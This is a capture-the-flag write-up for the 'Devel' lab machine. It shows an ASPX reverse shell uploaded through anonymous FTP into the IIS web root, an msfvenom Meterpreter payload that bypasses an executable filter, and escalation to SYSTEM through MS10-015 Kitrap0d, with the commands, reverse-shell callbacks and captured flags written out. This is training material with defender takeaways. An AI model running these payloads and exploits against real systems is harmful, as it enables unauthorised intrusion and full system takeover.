---
title: Devel
description: Anonymous FTP exposes the IIS web root directly. Upload an ASPX reverse shell, execute it via HTTP, escalate through an unpatched Windows 7 kernel.
---

# Devel

| | |
|---|---|
| **Difficulty** | Easy |
| **OS** | Windows 7 |
| **Focus** | Anonymous FTP + IIS web root exposure |

Devel is a box about default configurations left unchanged.
Two services are running — FTP and IIS — and on their own, neither is catastrophic.
The problem is how they interact: the FTP root and the IIS web root are the same directory.
Anonymous write access to FTP means anonymous code execution via the web server.

The machine is deliberately simple, but the misconfiguration it demonstrates shows up in real environments more than it should.

---

## Setup

Kali VM via QEMU. VPN connected with openvpn.
If large packets time out, lower the MTU on the tunnel interface:

```bash
sudo ip link set tun0 mtu 1200
```

---

## Enumeration

```bash
nmap -sC -sV -vv -oA nmap-init 10.129.31.137
```

**Open ports:**

| Port | Service | Detail |
|------|---------|--------|
| 21 | ftp | Microsoft ftpd — anonymous login allowed |
| 80 | http | Microsoft IIS 7.5 |

TTL 127 confirms Windows. Two services, and they immediately raise a question together.

The FTP anonymous listing shows:

```
03-18-17  02:06AM       <DIR>          aspnet_client
03-17-17  05:37PM                  689 iisstart.htm
03-17-17  05:37PM               184946 welcome.png
```

Those are IIS files — `iisstart.htm` and `welcome.png` are the default IIS 7 landing page assets, and `aspnet_client` is the standard ASP.NET client scripts folder.
The FTP root and the IIS web root are the same directory.

Navigating to `http://10.129.31.137` confirms it — the default IIS 7 splash page loads, serving the same `welcome.png` sitting in the FTP directory.

---

## Exploitation — ASPX Reverse Shell via FTP Upload

Since the FTP root and IIS web root are the same directory, any file uploaded via FTP is immediately accessible over HTTP. IIS 7.5 with ASP.NET installed will execute `.aspx` files server-side rather than serve them as plain text.

Used a pre-built ASPX reverse shell, uploaded it via anonymous FTP:

```bash
ftp 10.129.31.137
# user: anonymous
# pass: (blank)
put shell.aspx
```

Set up a listener:

```bash
sudo nc -lvnp 1234
```

Navigated to `http://10.129.31.137/shell.aspx` in the browser to trigger execution.

The shell connected back:

```
connect to [10.10.15.139] from (UNKNOWN) [10.129.31.137] 49164
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

c:\windows\system32\inetsrv>
```

```
c:\Users> whoami
iis apppool\web
```

Shell as the IIS application pool identity — a low-privileged service account.
The user flag is not readable from this context. Privilege escalation needed.

---

## Privilege Escalation

### System Reconnaissance

```
systeminfo
```

Key findings:

| Field | Value |
|-------|-------|
| OS | Windows 7 Enterprise |
| Build | 6.1.7600 (RTM — no service pack) |
| Architecture | X86-based PC |
| Hotfixes | **N/A** |
| Owner | babis |

`Hotfix(s): N/A` means zero patches have ever been applied to this machine.
Windows 7 RTM was released in 2009 — every local privilege escalation discovered in the years since is potentially on the table.
The architecture is x86, which matters for exploit compatibility.

### Upgrading to a Meterpreter Session

The netcat shell works for exploration but Metasploit's local exploit modules require a Meterpreter session.
Uploading a compiled `.exe` payload failed — the server accepted the transfer but the files landed as 0 bytes, indicating the server was stripping PE executables on write.

The fix: generate the Meterpreter payload as an `.aspx` file instead. IIS executes it as a web application, bypassing whatever was stripping standalone binaries.

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.15.139 LPORT=4444 -f aspx -o rshell.aspx
```

Upload via FTP (binary mode):

```bash
ftp 10.129.31.137
binary
put rshell.aspx
```

Set up the handler:

```bash
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST tun0
set LPORT 4444
run
```

Triggered execution by navigating to `http://10.129.31.137/rshell.aspx` in the browser.

```
[*] Sending stage (199238 bytes) to 10.129.31.137
[*] Meterpreter session 2 opened (10.10.15.139:4444 -> 10.129.31.137:49182)
```

### Exploit Selection — MS10-015 (Kitrap0d)

The `local_exploit_suggester` module crashed with a Ruby `NameError` — a known Metasploit bug, not a target issue.

With the OS version and patch level known (Windows 7 RTM, x86, no hotfixes), searching for applicable local privilege escalation exploits points quickly to MS10-015. Metasploit has a reliable module for it:

```
use exploit/windows/local/ms10_015_kitrap0d
set SESSION 2
set LHOST 10.10.15.139
set LPORT 4449
run
```

MS10-015 (Kitrap0d) is a privilege escalation vulnerability in the Windows kernel's Virtual DOS Machine (VDM) subsystem — present in every 32-bit Windows from 2000 through 7. It injects a payload into a spawned `netsh.exe` process and exploits the VDM to execute it as SYSTEM.

```
[*] Reflectively injecting payload and triggering the bug...
[*] Launching netsh to host the DLL...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Meterpreter session 3 opened (10.10.15.139:4449 -> 10.129.31.137:49183)
```

Dropped into a shell and confirmed:

```
c:\Users\babis> whoami
nt authority\system
```

SYSTEM. Both flags are now readable.

---

## Flags

```
c:\Users\babis\Desktop> type user.txt
55dc79700b81f2bb9736dc6be88d2d9e
```

<!-- 55dc79700b81f2bb9736dc6be88d2d9e -->

**User flag captured.**

```
c:\Users\Administrator\Desktop> type root.txt
0ab10396cc43e24187b22e11110788df
```

<!-- 0ab10396cc43e24187b22e11110788df -->

**Root flag captured. Box complete.**

---

!!! example "Conclusion"
    The entry point is a misconfiguration so simple it almost feels unfair: FTP anonymous write access to the IIS web root. Neither service is broken on its own — FTP anonymous access has legitimate uses, and IIS running on port 80 is unremarkable. The danger is the combination. Any file you can upload, the web server will serve. Any `.aspx` file it serves, it will execute. That's code execution without a single credential.

    The exe-stripping issue was a useful lesson. Whatever was zeroing out uploaded `.exe` files had no opinion about `.aspx` files — because those are served by the web application layer, not executed as PE binaries. Switching the payload format entirely bypassed the filter without needing to encode or obfuscate anything.

    The privilege escalation is almost mechanical on a fully unpatched Windows 7 x86 box. `Hotfix(s): N/A` is one of the clearest signals in pentesting — it means every public local exploit from that OS version's entire lifecycle is potentially valid. MS10-015 covers Windows 2000 through 7, works on x86, and has a reliable Metasploit module. On a box with no patches at all, the harder question is which exploit to pick first, not whether one exists.

    Defender takeaways: FTP anonymous write access should never point at a web root. The IIS application pool should run under a restricted service account, not one that can be leveraged to reach SYSTEM through an unpatched kernel. And patch management is not optional — a box that has never received a single hotfix will fall to the first public exploit that matches its architecture.
